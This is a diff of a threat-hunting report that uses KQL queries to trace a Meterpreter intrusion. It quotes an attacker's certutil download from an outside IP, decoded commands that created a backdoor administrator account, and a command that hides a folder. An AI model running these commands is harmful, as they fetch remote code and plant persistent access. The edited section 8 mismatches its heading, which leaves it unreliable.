@@ -99,66 +99,72 @@ DeviceProcessEvents
 
 ### 5. Persistence: C2 Implant 
 
-Searched for evidence of... 
-
-privilege enumeration and discovered that the attacker utilized the command "whoami.exe" /all" which provides comprehensive details about the security context of the compromised system including user name, security identifier (SID), group memberships, and privileges, enabling the attacker to understand their current access level.
+Searched for evidence of command and control implants used by attackers to maintain persistent access and enable remote control of compromised systems. The investigation revealed the extraction of the C2 beacon meterpreter.exe from the archive. Meterpreter is the famous payload/beacon from the Metasploit Framework, one of the most well-known offensive security/penetration testing tools. Meterpreter (short for "Meta-Interpreter") is a sophisticated C2 implant that runs in memory, provides interactive remote access, has extensive post-exploitation capabilities, and is commonly used by APT groups who repurpose legitimate pentesting tools.
 
 **Query used to locate events:**
 
 ```kql
-DeviceProcessEvents
-| where DeviceName == "azuki-fileserver01"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where FileName == "whoami.exe"
-| project TimeGenerated, ProcessCommandLine
+DeviceFileEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where FolderPath has @"C:\Windows\Temp\cache"
+| where ActionType == "FileCreated"
+| where FileName endswith ".exe"
+| project TimeGenerated, DeviceName, FileName, FolderPath
 | order by TimeGenerated asc
 
 ```
-<img width="1677" height="331" alt="CH_Q6" src="https://github.com/user-attachments/assets/e7882ca0-982d-4ad6-b458-2280585d3d61" />
+<img width="2202" height="826" alt="BT_Q7" src="https://github.com/user-attachments/assets/b9f6e6fb-2a15-483f-a337-cc7e61edfc44" />
 
 ---
 
-### 6. Discovery: Network Configuration 
+### 6. Persistence: Named Pipe 
 
-Searched for evidence of network configuration enumeration and discovered that the attacker utilized the command ""ipconfig.exe" /all" to better understand the environment topology. This command reveals comprehensive network details including DNS servers, DHCP configuration, domain membership, MAC addresses, and all network adapters, providing the attacker with a complete picture of the network environment.
+Searched for evidence of named pipe event actions typically used to provide stealthy interprocess communication channels for malware. The named pipe "\Device\NamedPipe\msf-pipe-5902" was created by meterpreter.exe 3 minutes after meterpreter.exe was extracted from the archive (4:21:33 AM extraction → 4:24:35 AM pipe creation) using the Metasploit Framework naming convention (msf-pipe-*).
 
 **Query used to locate events:**
 
 ```kql
-DeviceProcessEvents
-| where DeviceName == "azuki-fileserver01"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where FileName == "ipconfig.exe"
-| project TimeGenerated, ProcessCommandLine
+DeviceEvents
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where InitiatingProcessRemoteSessionIP == "10.1.0.204"
+| where InitiatingProcessFileName == "meterpreter.exe"
+| where ActionType == "NamedPipeEvent"
+| extend PipeName = parse_json(AdditionalFields).PipeName
+| project TimeGenerated, DeviceName, ActionType, PipeName, InitiatingProcessFileName
 | order by TimeGenerated asc
 
 ```
-<img width="1720" height="275" alt="CH_Q7" src="https://github.com/user-attachments/assets/d58c65c0-8a78-4232-9407-3c0dc237fc69" />
+<img width="2120" height="667" alt="BT_Q8" src="https://github.com/user-attachments/assets/72da30ab-ca45-41f2-93bd-19bd574de8b0" />
 
 ---
 
-### 7. Defense Evasion: Directory Hiding & Staging Directory Path
+### 7. Credential Access: Decoded Account Creation, Backdoor Account, & Decoded Privilege Escalation Command
 
-Searched for evidence of the modification of file system attributes since this is a technique employed by attackers to hide directories. This analysis revealed that the attacker modified file attributes to hide their staging directory utilizing the command ""attrib.exe" +h +s C:\Windows\Logs\CBS" and made it appear as a protected Windows system component. This command sets both hidden (+h) and system (+s) attributes on the directory, causing it to blend in with legitimate Windows system folders. The CBS (Component-Based Servicing) folder name was chosen to appear as a legitimate Windows log directory. In addition, the staging directory path was C:\Windows\Logs\CBS. This staging directory was created in a location designed to masquerade as legitimate Windows system logs, making it less likely to be discovered during casual system inspection.
+Searched for evidence of encoded payloads and discovered two Base64-encoded PowerShell commands. The decoded account creation command was the following: net user yuki.tanaka2 B@ckd00r2024! /add. The decoded privilege escalation command was the following: net localgroup Administrators yuki.tanaka2 /add. Therefore, the attacker created a backdoor account yuki.tanaka2 (similar to the compromised user yuki.tanaka) with administrator privileges using Base64 obfuscation to evade detection. 
  
 **Query used to locate events:**
 
 ```kql
 DeviceProcessEvents
-| where DeviceName == "azuki-fileserver01"
-| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
-| where FileName == "attrib.exe"
-| project TimeGenerated, ProcessCommandLine
+| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-26))
+| where DeviceName == "azuki-adminpc"
+| where FileName in~ ("powershell.exe", "pwsh.exe")
+| where ProcessCommandLine has "encodedcommand" or ProcessCommandLine has "-enc" or ProcessCommandLine has "-e "
+| project TimeGenerated, DeviceName, ProcessCommandLine
 | order by TimeGenerated asc
 
 ```
-<img width="1703" height="286" alt="CH_Q8" src="https://github.com/user-attachments/assets/e2586234-e6de-4413-930f-e990e891da3b" />
+<img width="2765" height="330" alt="BT_Q9B" src="https://github.com/user-attachments/assets/02c5339b-5a0f-49bb-8b22-7db0a4dea9e8" />
 
 ---
 
-### 8. Defense Evasion: Script Download 
+### 8. Discovery: Session Enumeration 
 
-Searched for evidence of malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.
+Searched for evidence of terminal services enumeration and discovered that...
+
+malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.
 
 **Query used to locate events:**
 
